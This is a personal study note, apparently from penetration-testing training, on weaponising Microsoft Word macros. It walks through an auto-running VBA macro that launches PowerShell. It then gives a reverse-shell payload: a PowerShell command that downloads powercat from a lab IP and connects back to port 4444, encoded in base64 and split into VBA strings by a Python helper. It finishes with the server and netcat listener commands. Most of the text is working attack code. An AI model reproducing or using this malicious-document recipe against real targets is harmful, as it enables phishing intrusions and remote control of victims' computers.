
MS Office allow users to embed macros (a series of instructions or commands) grouped together to programmatically achieve a task.

`Macros can be written from scratch in Visual Basic for Applications (VBA), which is a powerful scripting language with full access to ActiveX objects and the Windows Script Host, similar to JavaScript in HTML Applications`

`Bear in mind that older client-side attack vectors, including Dynamic Data Exchange (DDE)4 and various Object Linking and Embedding (OLE)5 methods do not work well today without significant target system modification`


#### Creating macro

In word we must use a `.doc` file not a `.docx` file - macros in` .docx` files are not persistent, only `.doc` files can save macros in the file. We can also use `.docm` files for our embedded macro

1. Save file as Word 97-2003 document.
2. Click View tab
3. click Macros element
4. enter macro name
5. select document from `Macros in:`
6. click create to insert a simple macro framework into document
7. Now we have a MS Visual Basic for Applications windows to develop our macro.

below we create a script that calls our "MyMacro" sub procedure when the document is opened or automatically opened.

Our sub procedure makes use of ActiveX Objects - which provide access to underlying operating system commands. This is/can be achieved with `WScript` through the` windows script host shell object`. Which we are using to launch powershell.

```
Sub AutoOpen()

  MyMacro
  
End Sub

Sub Document_Open()

  MyMacro
  
End Sub

Sub MyMacro()

  CreateObject("Wscript.Shell").Run "powershell"
  
End Sub
```

Click save.

When the document is opened we will need to enable content - which a powershell session will be started and opened.


#### Macro Reverse Shell

1. `IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell"` - base64 encode our payload to avoid special character issues using [[File Upload Vulnerabilities]] pwsh - `if port 4444 doesnt work, try other ports like 443`

2. use the following python script to construct our payload within VBA - we need to split up string literal (due to char limit) and concatenate the payload.

```
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

3.  We then have our payload

```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```

4. `python3 -m http.server 80` - Start a python web server to host our powercat file.
5. `nc -nvlp 4444` - start out Netcat listener for a connection.

`Our Enable Editing button will only appear again if the name of the document changes`

